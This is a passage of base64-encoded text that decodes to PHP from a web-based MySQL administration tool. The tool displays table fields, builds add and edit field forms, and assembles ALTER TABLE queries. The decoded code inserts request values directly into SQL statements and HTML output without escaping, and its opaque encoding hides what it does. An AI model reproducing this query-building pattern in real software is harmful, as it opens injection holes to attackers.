iPHRhYmxlIGNlbGxzcGFjaW5nPTEgY2VsbHBhZGRpbmc9NT5cbiI7DQoJZWNobyAiPHRyPlxuIjsNCgllY2hvICI8dGg+RmllbGQ8L3RoPlxuIjsNCgllY2hvICI8dGg+VHlwZTwvdGg+XG4iOw0KCWVjaG8gIjx0aD5OdWxsPC90aD5cbiI7DQoJZWNobyAiPHRoPktleTwvdGg+XG4iOw0KCWVjaG8gIjx0aD5EZWZhdWx0PC90aD5cbiI7DQoJZWNobyAiPHRoPkV4dHJhPC90aD5cbiI7DQoJZWNobyAiPHRoIGNvbHNwYW49Mj5BY3Rpb248L3RoPlxuIjsNCgllY2hvICI8L3RyPlxuIjsNCg0KCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCSRmaWVsZCA9IG15c3FsX2ZldGNoX2FycmF5KCAkcFJlc3VsdCApOw0KCQllY2hvICI8dHI+XG4iOw0KCQllY2hvICI8dGQ+Ii4kZmllbGRbIkZpZWxkIl0uIjwvdGQ+XG4iOw0KCQllY2hvICI8dGQ+Ii4kZmllbGRbIlR5cGUiXS4iPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD4iLiRmaWVsZFsiTnVsbCJdLiI8L3RkPlxuIjsNCgkJZWNobyAiPHRkPiIuJGZpZWxkWyJLZXkiXS4iPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD4iLiRmaWVsZFsiRGVmYXVsdCJdLiI8L3RkPlxuIjsNCgkJZWNobyAiPHRkPiIuJGZpZWxkWyJFeHRyYSJdLiI8L3RkPlxuIjsNCgkJJGZpZWxkbmFtZSA9ICRmaWVsZFsiRmllbGQiXTsNCgkJZWNobyAiPHRkPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZWRpdEZpZWxkJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJmZpZWxkbmFtZT0kZmllbGRuYW1lJz5FZGl0PC9hPjwvdGQ+XG4iOw0KCQllY2hvICI8dGQ+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1kcm9wRmllbGQmZGJuYW1lPSRkYm5hbWUmdGFibGVuYW1lPSR0YWJsZW5hbWUmZmllbGRuYW1lPSRmaWVsZG5hbWUnIG9uQ2xpY2s9XCJyZXR1cm4gY29uZmlybSgnRHJvcCBGaWVsZCBcJyRmaWVsZG5hbWVcJz8nKVwiPkRyb3A8L2E+PC90ZD5cbiI7DQoJCWVjaG8gIjwvdHI+XG4iOw0KCX0NCgllY2hvICI8L3RhYmxlPlxuIjsNCn0NCg0KZnVuY3Rpb24gbWFuYWdlRmllbGQoICRjbWQgKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJGZpZWxkbmFtZSwgJFBIUF9TRUxGOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGgxPkFkZCBGaWVsZDwvaDE+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkgew0KCQllY2hvICI8aDE+RWRpdCBGaWVsZDwvaDE+XG4iOw0KCQkkcFJlc3VsdCA9IG15c3FsX2RiX3F1ZXJ5KCAkZGJuYW1lLCAiU0hPVyBmaWVsZHMgRlJPTSAkdGFibGVuYW1lIiApOw0KCQkkbnVtID0gbXlzcWxfbnVtX3Jvd3MoICRwUmVzdWx0ICk7DQoJCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCQkkZmllbGQgPSBteXNxbF9mZXRjaF9hcnJheSggJHBSZXN1bHQgKTsNCgkJCWlmKCAkZmllbGRbIkZpZWxkIl0gPT0gJGZpZWxkbmFtZSApIHsNCgkJCQkkZmllbGR0eXBlID0gJGZpZWxkWyJUeXBlIl07DQoJCQkJJGZpZWxka2V5ID0gJGZpZWxkWyJLZXkiXTsNCgkJCQkkZmllbGRleHRyYSA9ICRmaWVsZFsiRXh0cmEiXTsNCgkJCQkkZmllbGRudWxsID0gJGZpZWxkWyJOdWxsIl07DQoJCQkJJGZpZWxkZGVmYXVsdCA9ICRmaWVsZFsiRGVmYXVsdCJdOw0KCQkJCWJyZWFrOw0KCQkJfQ0KCQl9DQoNCgkJJHR5cGUgPSBzdHJ0b2soICRmaWVsZHR5cGUsICIgKCwpXG4iICk7DQoJCWlmKCBzdHJwb3MoICRmaWVsZHR5cGUsICIoIiApICkgew0KCQkJaWYoICR0eXBlID09ICJlbnVtIiB8ICR0eXBlID09ICJzZXQiICkgew0KCQkJCSR2YWx1ZWxpc3QgPSBzdHJ0b2soICIgKClcbiIgKTsNCgkJCX0gZWxzZSB7DQoJCQkJJE0gPSBzdHJ0b2soICIgKCwpXG4iICk7DQoJCQkJaWYoIHN0cnBvcyggJGZpZWxkdHlwZSwgIiwiICkgKQ0KCQkJCQkkRCA9IHN0cnRvayggIiAoLClcbiIgKTsNCgkJCX0NCgkJfQ0KCX0NCg0KCWVjaG8gIjxwIGNsYXNzPWxvY2F0aW9uPiRkYm5hbWUgJmd0OyAkdGFibGVuYW1lPC9wPlxuIjsNCgllY2hvICI8Zm9ybSBhY3Rpb249JFBIUF9TRUxGPlxuIjsNCglpZiggJGNtZCA9PSAiYWRkIiApDQoJCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdGlvbiB2YWx1ZT1hZGRGaWVsZF9zdWJtaXQ+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkgew0KCQllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3Rpb24gdmFsdWU9ZWRpdEZpZWxkX3N1Ym1pdD5cbiI7DQoJCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPW9sZF9uYW1lIHZhbHVlPSRmaWVsZG5hbWU+XG4iOw0KCX0NCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kYm5hbWUgdmFsdWU9JGRibmFtZT5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9dGFibGVuYW1lIHZhbHVlPSR0YWJsZW5hbWU+XG4iOw0KCWVjaG8gIjxoMz5OYW1lPC9oMz5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9dGV4dCBuYW1lPW5hbWUgdmFsdWU9JGZpZWxkbmFtZT48cD5cbiI7DQoJZWNobyAnDQoNCjxoMz5UeXBlPC9oMz4NCjxmb250IHNpemU9MiBjbGFzcz0ibmV3Ij4NCiogYE1cJyBpbmRpY2F0ZXMgdGhlIG1heGltdW0gZGlzcGxheSBzaXplLjxicj4NCiogYERcJyBhcHBsaWVzIHRvIGZsb2F0aW5nLXBvaW50IHR5cGVzIGFuZCBpbmRpY2F0ZXMgdGhlIG51bWJlciBvZiBkaWdpdHMgZm9sbG93aW5nIHRoZSBkZWNpbWFsIHBvaW50Ljxicj4NCjwvZm9udD4NCjx0YWJsZT4NCjx0cj4NCjx0aD5UeXBlPC90aD48dGg+Jm5ic3BNJm5ic3A8L3RoPjx0aD4mbmJzcEQmbmJzcDwvdGg+PHRoPnVuc2lnbmVkPC90aD48dGg+emVyb2ZpbGw8L3RoPjx0aD5iaW5hcnk8L3RoPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlRJTllJTlQiICc7IGlmKCAkdHlwZSA9PSAidGlueWludCIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+VElOWUlOVCAoLTEyOCB+IDEyNyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iU01BTExJTlQiICc7IGlmKCAkdHlwZSA9PSAic21hbGxpbnQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlNNQUxMSU5UICgtMzI3NjggfiAzMjc2Nyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iTUVESVVNSU5UIiAnOyBpZiggJHR5cGUgPT0gIm1lZGl1bWludCIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+TUVESVVNSU5UICgtODM4ODYwOCB+IDgzODg2MDcpPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IklOVCIgJzsgaWYoICR0eXBlID09ICJpbnQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPklOVCAoLTIxNDc0ODM2NDggfiAyMTQ3NDgzNjQ3KTwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJCSUdJTlQiICc7IGlmKCAkdHlwZSA9PSAiYmlnaW50IiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5CSUdJTlQgKC05MjIzMzcyMDM2ODU0Nzc1ODA4IH4gOTIyMzM3MjAzNjg1NDc3NTgwNyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iRkxPQVQiICc7IGlmKCAkdHlwZSA9PSAiZmxvYXQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkZMT0FUPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IkRPVUJMRSIgJzsgaWYoICR0eXBlID09ICJkb3VibGUiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkRPVUJMRTwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJERUNJTUFMIiAnOyBpZiggJHR5cGUgPT0gImRlY2ltYWwiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkRFQ0lNQUwoTlVNRVJJQyk8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iREFURSIgJzsgaWYoICR0eXBlID09ICJkYXRlIiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5EQVRFICgxMDAwLTAxLTAxIH4gOTk5OS0xMi0zMSwgWVlZWS1NTS1ERCk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iREFURVRJTUUiICc7IGlmKCAkdHlwZSA9PSAiZGF0ZXRpbWUiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkRBVEVUSU1FICgxMDAwLTAxLTAxIDAwOjAwOjAwIH4gOTk5OS0xMi0zMSAyMzo1OTo1OSwgWVlZWS1NTS1ERCBISDpNTTpTUyk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iVElNRVNUQU1QIiAnOyBpZiggJHR5cGUgPT0gInRpbWVzdGFtcCIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+VElNRVNUQU1QICgxOTcwLTAxLTAxIDAwOjAwOjAwIH4gMjEwNi4uLiwgWVlZWU1NRERbSEhbTU1bU1NdXV0pPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlRJTUUiICc7IGlmKCAkdHlwZSA9PSAidGltZSIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+VElNRSAoLTgzODo1OTo1OSB+IDgzODo1OTo1OSwgSEg6TU06U1MpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IllFQVIiICc7IGlmKCAkdHlwZSA9PSAieWVhciIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+WUVBUiAoMTkwMSB+IDIxNTUsIDAwMDAsIFlZWVkpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IkNIQVIiICc7IGlmKCAkdHlwZSA9PSAiY2hhciIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+Q0hBUjwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPk88L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJWQVJDSEFSIiAnOyBpZiggJHR5cGUgPT0gInZhcmNoYXIiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlZBUkNIQVI8L3RkPg0KPHRkIGFsaWduPWNlbnRlcj5PPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+TzwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iVElOWVRFWFQiICc7IGlmKCAkdHlwZSA9PSAidGlueXRleHQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlRJTllURVhUICgwIH4gMjU1KTwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJURVhUIiAnOyBpZiggJHR5cGUgPT0gInRleHQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlRFWFQgKDAgfiA2NTUzNSk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iTUVESVVNVEVYVCIgJzsgaWYoICR0eXBlID09ICJtZWRpdW10ZXh0IiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5NRURJVU1URVhUICgwIH4gMTY3NzcyMTUpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IkxPTkdURVhUIiAnOyBpZiggJHR5cGUgPT0gImxvbmd0ZXh0IiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5MT05HVEVYVCAoMCB+IDQyOTQ5NjcyOTUpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlRJTllCTE9CIiAnOyBpZiggJHR5cGUgPT0gInRpbnlibG9iIiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5USU5ZQkxPQiAoMCB+IDI1NSk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iQkxPQiIgJzsgaWYoICR0eXBlID09ICJibG9iIiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5CTE9CICgwIH4gNjU1MzUpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9Ik1FRElVTUJMT0IiICc7IGlmKCAkdHlwZSA9PSAibWVkaXVtYmxvYiIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+TUVESVVNQkxPQiAoMCB+IDE2Nzc3MjE1KTwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJMT05HQkxPQiIgJzsgaWYoICR0eXBlID09ICJsb25nYmxvYiIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+TE9OR0JMT0IgKDAgfiA0Mjk0OTY3Mjk1KTwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJFTlVNIiAnOyBpZiggJHR5cGUgPT0gImVudW0iICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkVOVU08L3RkPg0KPHRkIGNvbHNwYW49NT48Y2VudGVyPnZhbHVlIGxpc3Q8L2NlbnRlcj48L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlNFVCIgJzsgaWYoICR0eXBlID09ICJzZXQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlNFVDwvdGQ+DQo8dGQgY29sc3Bhbj01PjxjZW50ZXI+dmFsdWUgbGlzdDwvY2VudGVyPjwvdGQ+DQo8L3RyPg0KPC90YWJsZT4NCjx0YWJsZT4NCjx0cj48dGg+TTwvdGg+PHRoPkQ8L3RoPjx0aD51bnNpZ25lZDwvdGg+PHRoPnplcm9maWxsPC90aD48dGg+YmluYXJ5PC90aD48dGg+dmFsdWUgbGlzdCAoZXg6IFwnYXBwbGVcJywgXCdvcmFuZ2VcJywgXCdiYW5hbmFcJykgPC90aD48L3RyPg0KPHRyPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT10ZXh0IHNpemU9NCBuYW1lPU0gJzsgaWYoICRNICE9ICIiICkgZWNobyAidmFsdWU9JE0iO2VjaG8gJz48L3RkPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT10ZXh0IHNpemU9NCBuYW1lPUQgJzsgaWYoICREICE9ICIiICkgZWNobyAidmFsdWU9JEQiO2VjaG8gJz48L3RkPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT1jaGVja2JveCBuYW1lPXVuc2lnbmVkIHZhbHVlPSJVTlNJR05FRCIgJzsgaWYoIHN0cnBvcyggJGZpZWxkdHlwZSwgInVuc2lnbmVkIiApICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPjwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPjxpbnB1dCB0eXBlPWNoZWNrYm94IG5hbWU9emVyb2ZpbGwgdmFsdWU9IlpFUk9GSUxMIiAnOyBpZiggc3RycG9zKCAkZmllbGR0eXBlLCAiemVyb2ZpbGwiICkgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9Y2hlY2tib3ggbmFtZT1iaW5hcnkgdmFsdWU9IkJJTkFSWSIgJzsgaWYoIHN0cnBvcyggJGZpZWxkdHlwZSwgImJpbmFyeSIgKSAgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9dGV4dCBzaXplPTYwIG5hbWU9dmFsdWVsaXN0ICc7IGlmKCAkdmFsdWVsaXN0ICE9ICIiICkgZWNobyAidmFsdWU9XCIkdmFsdWVsaXN0XCIiO2VjaG8gJz48L3RkPg0KPC90cj4NCjwvdGFibGU+DQo8aDM+RmxhZ3M8L2gzPg0KPHRhYmxlPg0KPHRyPjx0aD5ub3QgbnVsbDwvdGg+PHRoPmRlZmF1bHQgdmFsdWU8L3RoPjx0aD5hdXRvIGluY3JlbWVudDwvdGg+PHRoPnByaW1hcnkga2V5PC90aD48L3RyPg0KPHRyPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT1jaGVja2JveCBuYW1lPW5vdF9udWxsIHZhbHVlPSJOT1QgTlVMTCIgJzsgaWYoICRmaWVsZG51bGwgIT0gIllFUyIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9dGV4dCBuYW1lPWRlZmF1bHRfdmFsdWUgJzsgaWYoICRmaWVsZGRlZmF1bHQgIT0gIiIgKSBlY2hvICJ2YWx1ZT0kZmllbGRkZWZhdWx0IjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9Y2hlY2tib3ggbmFtZT1hdXRvX2luY3JlbWVudCB2YWx1ZT0iQVVUT19JTkNSRU1FTlQiICc7IGlmKCAkZmllbGRleHRyYSA9PSAiYXV0b19pbmNyZW1lbnQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPjwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPjxpbnB1dCB0eXBlPWNoZWNrYm94IG5hbWU9cHJpbWFyeV9rZXkgdmFsdWU9IlBSSU1BUlkgS0VZIiAnOyBpZiggJGZpZWxka2V5ID09ICJQUkkiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPjwvdGQ+DQo8L3RyPg0KPC90YWJsZT4NCjxwPic7DQoJaWYoICRjbWQgPT0gImFkZCIgKQ0KCQllY2hvICI8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0FkZCBGaWVsZCc+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdFZGl0IEZpZWxkJz5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9YnV0dG9uIHZhbHVlPUNhbmNlbCBvbkNsaWNrPSdoaXN0b3J5LmJhY2soKSc+XG4iOw0KCWVjaG8gIjwvZm9ybT5cbiI7DQp9DQoNCmZ1bmN0aW9uIG1hbmFnZUZpZWxkX3N1Ym1pdCggJGNtZCApIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkb2xkX25hbWUsICRuYW1lLCAkdHlwZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2csDQoJCSRNLCAkRCwgJHVuc2lnbmVkLCAkemVyb2ZpbGwsICRiaW5hcnksICRub3RfbnVsbCwgJGRlZmF1bHRfdmFsdWUsICRhdXRvX2luY3JlbWVudCwgJHByaW1hcnlfa2V5LCAkdmFsdWVsaXN0Ow0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJJHF1ZXJ5U3RyID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUgQUREICRuYW1lICI7DQoJZWxzZSBpZiggJGNtZCA9PSAiZWRpdCIgKQ0KCQkkcXVlcnlTdHIgPSAiQUxURVIgVEFCTEUgJHRhYmxlbmFtZSBDSEFOR0UgJG9sZF9uYW1lICRuYW1lICI7DQoJaWYoICRNICE9ICIiICkNCgkJaWYoICREICE9ICIiICkNCgkJCSRxdWVyeVN0ciAuPSAiJHR5cGUoJE0sJEQpICI7DQoJCWVsc2UNCgkJCSRxdWVyeVN0ciAuPSAiJHR5cGUoJE0pICI7DQoJZWxzZSBpZiggJHZhbHVlbGlzdCAhPSAiIiApIHsNCgkJJHZhbHVlbGlzdCA9IHN0cmlwc2xhc2hlcyggJHZhbHVlbGlzdCApOw0KCQkkcXVlcnlTdHIgLj0gIiR0eXBlKCR2YWx1ZWxpc3QpICI7DQoJfSBlbHNlDQoJCSRxdWVyeVN0ciAuPSAiJHR5cGUgIjsNCgkkcXVlcnlTdHIgLj0gIiR1bnNpZ25lZCAkemVyb2ZpbGwgJGJpbmFyeSAiOw0KCWlmKCAkZGVmYXVsdF92YWx1ZSAhPSAiIiApDQoJCSRxdWVyeVN0ciAuPSAiREVGQVVMVCAnJGRlZmF1bHRfdmFsdWUnICI7DQoJJHF1ZXJ5U3RyIC49ICIkbm90X251bGwgJGF1dG9faW5jcmVtZW50IjsNCglteXNxbF9zZWxlY3RfZGIoICRkYm5hbWUsICRteXNxbEhhbmRsZSApOw0KCW15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIsICRteXNxbEhhbmRsZSApOw0KCSRlcnJNc2cgPSBteXNxbF9lcnJvcigpOw0KCS8vIGtleSBjaGFuZ2UNCgkka2V5Q2hhbmdlID0gZmFsc2U7DQoJJHJlc3VsdCA9IG15c3FsX3F1ZXJ5KCAiU0hPVyBLRVlTIEZST00gJHRhYmxlbmFtZSIgKTsNCgkkcHJpbWFyeSA9ICIiOw0KCXdoaWxlKCAkcm93ID0gbXlzcWxfZmV0Y2hfY